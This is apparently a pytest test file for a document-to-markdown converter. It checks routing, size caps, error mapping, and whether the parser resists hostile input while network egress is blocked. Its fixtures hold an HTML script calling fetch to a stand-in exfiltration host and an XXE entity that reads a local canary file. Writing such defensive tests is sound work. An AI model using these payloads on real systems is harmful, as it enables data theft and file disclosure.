"""``file_to_markdown`` for the Office and web formats: routing, limits, error mapping, G12 with the real engine.

Facade tests use a stub engine (no Docling). The security tests at the end run the real ``DoclingEngine``
with network egress blocked: HTML with scripts and remote images, Markdown with remote images, OOXML with an
external entity.
"""

from __future__ import annotations

import socket
import zipfile
from pathlib import Path

import pytest
from docling.exceptions import ConversionError

from engine_stub_support import OfficeStubEngine
from file_parsers import limits
from file_parsers.convert import file_to_markdown
from file_parsers.engines.docling import DoclingEngine, engine_id
from file_parsers.engines.port import UnsupportedFormatError
from file_parsers.formats import FORMATS, DocumentFormat
from file_parsers.limits import DocumentParseFailedError, DocumentTooLargeError
from file_parsers.office.model import OfficeContent, OfficeSection
from office_support import (
    DOCX,
    PPTX,
    XLSX,
    build_csv,
    build_docx,
    build_pptx,
    build_xlsx,
    minimal_deck,
    rewrite_member,
    with_dtd,
)


def content(document_format: DocumentFormat, markdown: str = "text") -> OfficeContent:
    return OfficeContent(document_format, (OfficeSection(number=1, markdown=markdown),))


def test_an_office_type_goes_to_the_engine_and_the_parser_is_the_engine_id(tmp_path: Path):
    engine = OfficeStubEngine(content(DocumentFormat.MARKDOWN, "# Hello"))
    path = tmp_path / "a.md"
    path.write_text("# Hello\n", encoding="utf-8")
    result = file_to_markdown(path, "text/markdown", engine=engine)
    assert result.markdown == "# Hello\n"
    assert result.parser == "stub-office@1"
    assert engine.office_calls == [(path, "text/markdown")]
    assert engine.calls == []  # the PDF path is not used


def test_every_accepted_non_pdf_type_is_routed_to_the_office_path(tmp_path: Path):
    for spec in FORMATS:
        if spec.format is DocumentFormat.PDF:
            continue
        engine = OfficeStubEngine(content(spec.format))
        path = tmp_path / f"f{spec.extension}"
        path.write_bytes(b"x")
        try:
            file_to_markdown(path, spec.media_type, engine=engine)
        except DocumentParseFailedError:
            pass  # the guard refuses the placeholder bytes of an OOXML type; routing is what matters here
        else:
            assert engine.office_calls


def test_an_unknown_media_type_is_unsupported(tmp_path: Path):
    with pytest.raises(UnsupportedFormatError):
        file_to_markdown(
            tmp_path / "a.doc", "application/msword", engine=OfficeStubEngine(content(DocumentFormat.DOCX))
        )


def test_the_guard_runs_before_the_engine_and_its_error_passes_through(tmp_path: Path):
    engine = OfficeStubEngine(content(DocumentFormat.DOCX))
    path = tmp_path / "not.docx"
    path.write_bytes(b"this is not a zip")
    with pytest.raises(DocumentParseFailedError):
        file_to_markdown(path, DOCX, engine=engine)
    assert engine.office_calls == []


def test_a_too_large_file_never_reaches_the_engine(tmp_path: Path):
    engine = OfficeStubEngine(content(DocumentFormat.CSV))
    path = build_csv(tmp_path / "wide.csv", "\n".join(["1,2,3,4"] * (limits.MAX_CELLS // 4 + 1)))
    with pytest.raises(DocumentTooLargeError):
        file_to_markdown(path, "text/csv", engine=engine)
    assert engine.office_calls == []


def test_an_engine_failure_becomes_document_parse_failed_with_the_exception_type_only(tmp_path: Path):
    engine = OfficeStubEngine(failure=RuntimeError("secret detail from /private/path"))
    path = tmp_path / "a.md"
    path.write_text("x", encoding="utf-8")
    with pytest.raises(DocumentParseFailedError) as caught:
        file_to_markdown(path, "text/markdown", engine=engine)
    assert str(caught.value) == "cannot parse markdown: RuntimeError"
    assert "secret" not in str(caught.value)
    assert isinstance(caught.value.__cause__, RuntimeError)


def test_an_engine_that_refuses_the_type_is_unsupported_not_a_parse_failure(tmp_path: Path):
    engine = OfficeStubEngine(failure=UnsupportedFormatError("text/markdown"))
    path = tmp_path / "a.md"
    path.write_text("x", encoding="utf-8")
    with pytest.raises(UnsupportedFormatError):
        file_to_markdown(path, "text/markdown", engine=engine)


def test_markdown_at_the_size_cap_passes_and_one_byte_over_is_too_large(tmp_path: Path):
    path = tmp_path / "a.md"
    path.write_text("x", encoding="utf-8")
    at_cap = "a" * (limits.MAX_MARKDOWN_BYTES - 1)  # plus the trailing newline
    result = file_to_markdown(path, "text/markdown", engine=OfficeStubEngine(content(DocumentFormat.MARKDOWN, at_cap)))
    assert len(result.markdown.encode()) == limits.MAX_MARKDOWN_BYTES
    with pytest.raises(DocumentTooLargeError) as caught:
        file_to_markdown(path, "text/markdown", engine=OfficeStubEngine(content(DocumentFormat.MARKDOWN, at_cap + "a")))
    assert (caught.value.what, caught.value.actual, caught.value.limit) == (
        "markdown bytes",
        limits.MAX_MARKDOWN_BYTES + 1,
        limits.MAX_MARKDOWN_BYTES,
    )


def test_the_size_cap_counts_utf8_bytes_not_characters(tmp_path: Path):
    path = tmp_path / "a.md"
    path.write_text("x", encoding="utf-8")
    wide = "é" * (limits.MAX_MARKDOWN_BYTES // 2)  # exactly the cap in bytes, plus the newline
    with pytest.raises(DocumentTooLargeError):
        file_to_markdown(path, "text/markdown", engine=OfficeStubEngine(content(DocumentFormat.MARKDOWN, wide)))


def test_progress_is_reported_once_at_the_end(tmp_path: Path):
    calls: list[tuple[int, int]] = []
    sections = (OfficeSection(1, "a"), OfficeSection(2, "b"))
    path = build_pptx(tmp_path / "d.pptx", [("A", ["x"]), ("B", ["y"])])
    file_to_markdown(
        path,
        PPTX,
        engine=OfficeStubEngine(OfficeContent(DocumentFormat.PPTX, sections)),
        on_progress=lambda d, t: calls.append((d, t)),
    )
    assert calls == [(2, 2)]


def test_a_501_slide_deck_is_refused_before_conversion(tmp_path: Path):
    engine = OfficeStubEngine(content(DocumentFormat.PPTX))
    with pytest.raises(DocumentTooLargeError) as caught:
        file_to_markdown(minimal_deck(tmp_path / "deck.pptx", 501, folder="relocated"), PPTX, engine=engine)
    assert caught.value.what == "slides"
    assert engine.office_calls == []


# --- the real engine ---------------------------------------------------------------------------------------------


def test_the_real_engine_accepts_all_seven_types_and_refuses_others(tmp_path: Path):
    engine = DoclingEngine(threads=1)
    assert engine.formats == {spec.media_type for spec in FORMATS}
    with pytest.raises(UnsupportedFormatError):
        engine.extract_office(tmp_path / "a.pdf", "application/pdf")
    with pytest.raises(UnsupportedFormatError):
        engine.extract_office(tmp_path / "a.doc", "application/msword")
    with pytest.raises(UnsupportedFormatError):
        engine.extract(tmp_path / "a.docx", DOCX)


def test_the_real_engine_reports_progress_once_and_logs_the_conversion(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
):
    calls: list[tuple[int, int]] = []
    path = build_xlsx(tmp_path / "b.xlsx", [("A", [["a"]]), ("B", [["b"]])])
    with caplog.at_level("INFO"):
        result = file_to_markdown(path, XLSX, on_progress=lambda d, t: calls.append((d, t)))
    assert result.parser == engine_id()
    assert calls == [(2, 2)]
    assert any(r.getMessage() == "office.document.done" for r in caplog.records)


def test_a_file_docling_cannot_read_is_document_parse_failed(tmp_path: Path):
    # A valid ZIP that passes the guard but is not a Word document.
    path = tmp_path / "fake.docx"
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("hello.txt", "not a document")
    with pytest.raises(DocumentParseFailedError):
        file_to_markdown(path, DOCX)


@pytest.fixture
def blocked_network(monkeypatch: pytest.MonkeyPatch) -> list[str]:
    """Egress blocked: any attempt to resolve a name or open a connection fails the test and is recorded."""

    attempts: list[str] = []

    def refuse(*args: object, **kwargs: object) -> None:
        attempts.append(repr(args)[:80])
        raise OSError("network egress is blocked in this test")

    monkeypatch.setattr(socket.socket, "connect", refuse)
    monkeypatch.setattr(socket, "getaddrinfo", refuse)
    return attempts


def test_html_with_scripts_and_remote_images_is_parsed_without_running_or_fetching_anything(
    tmp_path: Path, blocked_network: list[str]
):
    html = (
        "<html><head><script>document.title = 'SCRIPTRAN'; fetch('http://exfil.invalid/x')</script>"
        "<link rel='stylesheet' href='http://css.invalid/a.css'></head><body>"
        "<h1>Visible Heading</h1><p>Visible paragraph text.</p>"
        "<img src='http://img.invalid/remote.png' alt='remote'>"
        "<img src='file:///etc/hostname' alt='local'><img src='../secret.png' alt='relative'>"
        "<iframe src='http://frame.invalid/'></iframe>"
        "<script>alert('SCRIPTBODY')</script></body></html>"
    )
    path = tmp_path / "hostile.html"
    path.write_text(html, encoding="utf-8")
    markdown = file_to_markdown(path, "text/html").markdown
    assert "# Visible Heading" in markdown
    assert "Visible paragraph text." in markdown
    assert "SCRIPTRAN" not in markdown
    assert "SCRIPTBODY" not in markdown
    assert "exfil.invalid" not in markdown
    assert "data:image" not in markdown
    assert blocked_network == []


def test_markdown_with_remote_and_local_images_does_not_fetch_or_embed_them(tmp_path: Path, blocked_network: list[str]):
    secret = tmp_path / "secret.png"
    secret.write_bytes(b"\x89PNG not really")
    path = tmp_path / "images.md"
    path.write_text(
        f"# Doc\n\n![remote](http://img.invalid/a.png)\n\n![local]({secret})\n\n![rel](secret.png)\n\nText.\n",
        encoding="utf-8",
    )
    markdown = file_to_markdown(path, "text/markdown").markdown
    assert "# Doc" in markdown
    assert "data:image" not in markdown
    assert blocked_network == []


@pytest.mark.parametrize(
    ("kind", "member"),
    [("docx", "word/document.xml"), ("pptx", "ppt/slides/slide1.xml"), ("xlsx", "xl/worksheets/sheet1.xml")],
)
def test_ooxml_with_an_external_entity_is_refused_and_the_canary_never_read(
    kind: str, member: str, tmp_path: Path, blocked_network: list[str]
):
    sources = {
        "docx": (build_docx(tmp_path / "s.docx"), DOCX),
        "pptx": (build_pptx(tmp_path / "s.pptx", [("T", ["x"])]), PPTX),
        "xlsx": (build_xlsx(tmp_path / "s.xlsx", [("S", [["a"]])]), XLSX),
    }
    canary = tmp_path / "canary.txt"
    canary.write_text("TOPSECRETCANARY", encoding="utf-8")
    source, media_type = sources[kind]
    hostile = with_dtd(source, tmp_path / f"x.{kind}", member, canary)
    with pytest.raises(DocumentParseFailedError, match="DTD"):
        file_to_markdown(hostile, media_type)
    assert blocked_network == []


@pytest.mark.parametrize(("kind", "member"), [("docx", "word/document.xml"), ("xlsx", "xl/worksheets/sheet1.xml")])
def test_even_without_the_guard_the_parsers_do_not_resolve_the_entity(kind: str, member: str, tmp_path: Path):
    # Defence in depth: the entity file is handed straight to Docling (the guard bypassed). It must never
    # appear in the output, whatever the libraries do with the DTD (read the entity as empty, or refuse).
    sources = {
        "docx": (build_docx(tmp_path / "s.docx"), DOCX),
        "xlsx": (build_xlsx(tmp_path / "s.xlsx", [("S", [["PLACEHOLDER"]])]), XLSX),
    }
    canary = tmp_path / "canary.txt"
    canary.write_text("TOPSECRETCANARY", encoding="utf-8")
    source, media_type = sources[kind]
    token = b"Platform Overview" if kind == "docx" else b"PLACEHOLDER"
    dtd = f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "file://{canary}">]>'.encode()
    hostile = rewrite_member(
        source,
        tmp_path / f"x.{kind}",
        member,
        lambda data: (
            dtd + data
            if not data.startswith(b"<?xml")
            else data[: data.index(b"?>") + 2] + dtd + data[data.index(b"?>") + 2 :]
        ).replace(token, b"&xxe;", 1),
    )
    try:
        extracted = DoclingEngine(threads=1).extract_office(hostile, media_type)
    except (RuntimeError, ConversionError):
        return  # refusing the document is as safe as ignoring the entity
    assert "TOPSECRETCANARY" not in repr(extracted)
